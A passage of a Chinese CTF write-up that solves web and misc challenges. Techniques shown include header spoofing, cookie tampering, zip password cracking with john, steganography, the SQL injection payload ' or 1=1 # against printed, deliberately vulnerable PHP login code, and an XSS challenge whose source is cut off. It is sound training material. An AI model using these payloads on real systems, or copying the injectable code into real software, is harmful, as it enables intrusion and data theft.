title="2.ez_maze"></a>2.ez_maze</h3><blockquote><p>你能通关大土豆写的网页迷宫吗？<br>小土豆想看看源代码摸索摸索门道，但是这是什么？？</p></blockquote><p><strong>解法一</strong>：</p><p>​如果不进行反混淆的话会发现这样一个常量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const flag = &#x27;ROIS&#123;Its_&#x27; + _0x2e725b(0x180) + _0x2e725b(0x17a) + _0x2e725b(0x16a);</span><br></pre></td></tr></table></figure><p>​直接在浏览器控制台输入flag这个常量，就会出现所对应的值</p><p><strong>解法二</strong>：</p><p>​看到js这么一大坨类似乱码的，肯定是经过了混淆处理的，直接拖到反混淆工具里去（<a href="https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html">JavaScript Deobfuscator (dev-coco.github.io)</a>），最后在一串的代码中找到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const flag = &#x27;ROIS&#123;Its_fun_to_play_maze_with_js!&#125;&#x27;;</span><br></pre></td></tr></table></figure><p><strong>解法三</strong>：</p><p>​由于是纯前端文件，所以也可以修改js代码实现弹出</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">movePlayer</span>(<span class="params">_0x2fa2ec, _0x1d96bc</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> _0x4c26cf = _0x2e725b,</span><br><span class="line">_0x45acd1 = <span class="title class_">Math</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x177</span>)](_0x1d96bc / cellSize),</span><br><span class="line">_0x118e43 = <span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x2fa2ec / cellSize);</span><br><span class="line"><span class="keyword">if</span> (maze[_0x45acd1][_0x118e43] === <span class="number">0x1</span>) <span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x173</span>)), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="title function_">_0x4c26cf</span>(<span class="number">0x164</span>)] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> maze[_0x45acd1][_0x118e43] === <span class="number">0x2</span> ? (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, <span class="title function_">clearCanvas</span>(), <span class="title function_">drawMaze</span>(), <span class="title function_">drawPlayer</span>(playerX, playerY));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上是关于flag弹出的代码，重点在后面一个else上，有一个三元运算符<code>：？</code>进行条件的判定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> maze[_0x45acd1][_0x118e43] === <span class="number">0x2</span> ? (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>) : (playerX = _0x118e43 * cellSize, playerY = _0x45acd1 * cellSize, <span class="title function_">clearCanvas</span>(), <span class="title function_">drawMaze</span>(), <span class="title function_">drawPlayer</span>(playerX, playerY));</span><br></pre></td></tr></table></figure><p>直接爆改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">movePlayer</span>(<span class="params">_0x2fa2ec, _0x1d96bc</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> _0x4c26cf = _0x2e725b,</span><br><span class="line">_0x45acd1 = <span class="title class_">Math</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x177</span>)](_0x1d96bc / cellSize),</span><br><span class="line">_0x118e43 = <span class="title class_">Math</span>[<span class="string">&#x27;floor&#x27;</span>](_0x2fa2ec / cellSize);</span><br><span class="line"> (<span class="title function_">alert</span>(<span class="title function_">_0x4c26cf</span>(<span class="number">0x16e</span>) + flag), <span class="title function_">resetGame</span>(), <span class="variable language_">window</span>[<span class="title function_">_0x4c26cf</span>(<span class="number">0x168</span>)][<span class="string">&#x27;href&#x27;</span>] = <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就直接弹出flag了</p><p><strong>解法四</strong>：</p><p>​最开始我以为要拖动红点然后鼠标放红点上，后面按两下回车把撞墙的弹窗关了，flag就弹出来了</p><h3 id="3-easy-PDD"><a href="#3-easy-PDD" class="headerlink" title="3.easy_PDD"></a>3.easy_PDD</h3><blockquote><p>题目开始提示：<strong>一种基于ip的检测技术</strong></p></blockquote><p>盲猜就是发送请求头<strong>X-Forwarded-For</strong>（xxf）后跟不同的地址。bp，启动！！！</p><p>添加入请求头</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:233.233.233.233</span><br></pre></td></tr></table></figure><p>四选一个数字设成playroad然后设置playroad类型为数值，设置100个以上的数字即可</p><h3 id="4-HTTP-Challenge"><a href="#4-HTTP-Challenge" class="headerlink" title="4.HTTP_Challenge"></a>4.HTTP_Challenge</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">this is GET method,</span><br><span class="line">your mission:</span><br><span class="line"></span><br><span class="line">1.I need a GET param &quot;ROIS&quot; valued 405</span><br><span class="line">2.I need a POST param &quot;Vegetables&quot; valued &quot;Potato&quot;</span><br><span class="line">3.Please use admin character</span><br><span class="line">4.request from 127.0.0.1</span><br><span class="line">5.use browser &#x27;ROISBrowser&#x27;</span><br><span class="line">Complete All Missions, and I&#x27;ll give you the FLAG!!!</span><br></pre></td></tr></table></figure><p>根据题目要求</p><ul><li>1.get传参变量ROIS&#x3D;405，方式就是直接在url后加?ROIS&#x3D;405</li><li>2.POST传参变量Vegetables&#x3D;Potato</li><li>3.<code>Please use admin character</code>,使用hackbar抓包发送一次请求后再次抓包，发现cookie中存在这一变量，<code>character=guest</code>，直接把guest改成admin即可</li><li>4.<code>request from 127.0.0.1</code>与easy_PDD这一题一样的trick，设置<code>X-Forwarded-For:127.0.0.1</code></li><li>5.use browser ‘ROISBrowser’<del>（打开rois官网下载ROIS浏览器）</del>，设置<code>useragent:ROISBrowse</code></li></ul><h2 id="Web作业"><a href="#Web作业" class="headerlink" title="Web作业"></a>Web作业</h2><h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>刚进来看到这个页面</p><p><img src="/./rois-2024-winter-camp/65b8f2fb3adb2.png" alt="image-20240130210031334"></p><p>然后一顿乱尝试，最后打开源码看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span>氛围<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​<code>style</code>属性将边框和光标变化去除，<code>onclick</code>导致无法点击这个链接，在页面看起来和其他无差异</p><p>然后拼接url进入下一个页面</p><blockquote><p>页面提示：It doesn’t come from ‘<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a>‘</p></blockquote><p>添加请求头：<code>Referer:https://Sycsecret.buuoj.cn</code></p><blockquote><p>页面提示：Please use “Syclover” browser</p></blockquote><p>修改user-agent请求头：<code>User-Agent:Syclover</code></p><blockquote><p>页面提示：No!!! you can only read this locally!!!</p></blockquote><p>locally大概率就是通过ip进行检测，添加请求头：<code>X-Forwarded-For:127.0.0.1</code></p><p>最后成功拿到flag：<code>flag&#123;5d07ecd7-a0b7-4aa3-a3f7-fb7ec9afa6cb&#125;</code></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="easy-password-zip"><a href="#easy-password-zip" class="headerlink" title="easy_password_zip"></a>easy_password_zip</h3><blockquote><p>听说太简单的密码会被爆破，尊嘟假嘟o.O</p></blockquote><p>​根据题目提示，直接拿到kali里面爆破<del>（不得不说就给2核，kali跑的真的慢）</del></p><p><em>John是一款Kali linux自带的密码破解工具，支持密码本破解。John基于密码本破解</em></p><p>输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip2john flag.zip &gt; flag .txt </span><br><span class="line"></span><br><span class="line">john flag.txt  </span><br></pre></td></tr></table></figure><p>跑了很久之后，获得密码：passw</p><h3 id="pseudo-encryption-zip"><a href="#pseudo-encryption-zip" class="headerlink" title="pseudo_encryption_zip"></a>pseudo_encryption_zip</h3><blockquote><p>土豆非常热爱爆破，小涂决定做一道永远不可能爆出密码的。</p></blockquote><p>​根据题目提示，zip被修改二进制数据后实现伪加密<del>（发现MISC题目的hint全在题目上哈哈哈哈哈哈哈哈哈哈）</del></p><p>zip伪加密是在<strong>文件头的加密标志位做修改</strong>，进而再打开文件时识被别为加密压缩包。</p><p>做这题时候的参考文章：</p><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/99851686">CTF——MISC——zip伪加密总结_zip伪加密实验总结-CSDN博客</a></p><p><img src="/./rois-2024-winter-camp/65ba2fe5d0101.png" alt="1706700750476"></p><p>找到全局方式位标记（有无加密）发现都被改成了<code>01 00</code>修改成<code>00 00</code>再次打开压缩包就发现flag.txt没有被加密,打开即可获得flag</p><h3 id="crc32-easy-zip"><a href="#crc32-easy-zip" class="headerlink" title="crc32_easy_zip"></a>crc32_easy_zip</h3><blockquote><p>到底什么人会把文件拆开再放在一起压缩啊？小涂如是说。</p><p>PS: flag不含花括号。</p></blockquote><p><img src="/./rois-2024-winter-camp/65ba31ac97e6d.png" alt="image-20240131194028247"></p><p>打开发现都是小于12字节的txt文件<del>（最开始以为是铭文碰撞，然后发现不行）</del>，然后再网上一通乱找，发现了对于字节比较少的txt文件可以进行crc32碰撞，最后将这些内容拼接起来就可以拿到答案了</p><h3 id="LSB-png"><a href="#LSB-png" class="headerlink" title="LSB_png"></a>LSB_png</h3><blockquote><p>小涂拿放大镜看瞎了眼，也没找到flag。</p></blockquote><p>一顿搜索找到了工具：Stegsolve</p><ol><li>打开加密图片后，选择Analyse-DataExtract</li><li>Bit Planes 选中Reg、Green、Blue的第0位</li><li>然后选择预览</li></ol><p><img src="/./rois-2024-winter-camp/65ba3569520eb.png" alt="1706702138995"></p><p>获得flag</p><h3 id="change-size-png"><a href="#change-size-png" class="headerlink" title="change_size_png"></a>change_size_png</h3><p>把图片拖到kali里面打开，然后发现图片打不开，估计就是图片的长宽高被修改了</p><p>一通梭哈，找到了个脚本通过crc32反推长宽高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexStr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b +=struct.pack(<span class="string">&quot;B&quot;</span>,<span class="built_in">int</span>(temp,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line">str1=<span class="string">&quot;49484452&quot;</span><span class="comment">#文件头数据块标示IDCH</span></span><br><span class="line">str2=<span class="string">&quot;0806000000&quot;</span></span><br><span class="line">bytes1=hexStr2bytes(str1)</span><br><span class="line">bytes2=hexStr2bytes(str2)</span><br><span class="line">wid,hei = <span class="number">248</span>,<span class="number">248</span><span class="comment">#修改此处的宽高</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&quot;0x72571F5D&quot;</span><span class="comment">#请修改此处crc32的值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid,wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei,hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_temp=hexStr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_temp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w),<span class="built_in">hex</span>(h))</span><br></pre></td></tr></table></figure><p>最后运行结果得出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\MISC\图片隐写&gt; python 图片高宽检测.py</span><br><span class="line">0xf8 0x19f</span><br></pre></td></tr></table></figure><p>然后用101editor修改图片的相关参数，就可以得到flag</p><p><img src="/./rois-2024-winter-camp/65ba39bb6f5b1.png" alt="1706703282599"></p><h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="SQL注入小测试-easy"><a href="#SQL注入小测试-easy" class="headerlink" title="SQL注入小测试-easy"></a>SQL注入小测试-easy</h3><p>源码（黑盒测试，写题的时候是没有源码的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;easy&quot;</span>, <span class="string">&quot;easy&quot;</span>, <span class="string">&quot;easy&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$row</span>[<span class="number">2</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于是黑盒测试，先向输入框写入语句，<code>&#39; or 1=1 #</code>判断一下注入，然后就直接弹出来flag了</p><h3 id="SQL注入小测试-normal"><a href="#SQL注入小测试-normal" class="headerlink" title="SQL注入小测试-normal"></a>SQL注入小测试-normal</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;normal&quot;</span>, <span class="string">&quot;normal&quot;</span>, <span class="string">&quot;normal&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27;&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户：&quot;</span> . <span class="variable">$row</span>[<span class="number">1</span>] . <span class="string">&quot; 欢迎登录！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户: &quot;</span> . <span class="variable">$username</span> . <span class="string">&quot; 不存在或密码错误！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样的是黑盒测试，先向输入框写入语句，<code>&#39; or 1=1 #</code>判断一下注入，发现<strong>无论是在用户名处使用语句还是密码处使用语句</strong>都是可以进行登录的，判断是直接进行sql的语句拼接，同时存在一个<strong>回显点</strong>，后使用联合注入法（文章：<a href="/posts/1145624611/">SQL注入-联合查询(union)注入 | WELLS Blog</a>），从爆数据库再到爆字段再到获得flag（写的比较简陋）</p><h3 id="SQL注入小测试-hard"><a href="#SQL注入小测试-hard" class="headerlink" title="SQL注入小测试-hard"></a>SQL注入小测试-hard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$connect</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;hard&quot;</span>, <span class="string">&quot;hard&quot;</span>, <span class="string">&quot;hard&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$connect</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$password</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户名或密码不能为空！&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;欢迎登录！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;用户: &quot;</span> . <span class="variable">$username</span> . <span class="string">&quot; 不存在或密码错误！&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;进不去！怎么想我都进不去吧？！&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>与之前相同的黑盒测试，写入语句<code>&#39; or 1=1 #</code>判断一下注入，同样发现<strong>无论是在用户名处使用语句还是密码处使用语句</strong>都是可以进行登录的，判断也是直接进行sql的语句拼接</p><p>与之前不同的是不存在<strong>回显点</strong>，后使用布尔忙注法（文章：<a href="/posts/1685515616/">SQL注入-布尔盲注 | WELLS Blog </a>），推荐使用脚本进行，与前面相同的顺序从爆数据库再到爆字段再到爆flag</p><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web"></a>Web</h2><h3 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h3><p>xss入门题目，一通观察源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">report</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">`http://<span class="subst">$&#123;<span class="variable language_">document</span>.location.hostname&#125;</span>:8001/report.html?e=`</span>+<span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#input-textarea&#x27;</span>).<span class="property">value</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">payload</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">let</span> parsed = acorn.<span class="title function_">parse</span>(payload, &#123; <span class="attr">ecmaVersion</span>: <span class="string">&#x27;latest&#x27;</span> &#125;).<span class="property">body</span>;</span><br><span class="line"><span class="title function_">alert</span>(<span class="built_in">eval</span>(payload));</span><br><span class="line">&#125; <span class="keyword">catch</span>(e)&#123; </span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;Error: &#x27;</span>+e);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function"><span class="params">_</span>=&gt;</span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(p) <span 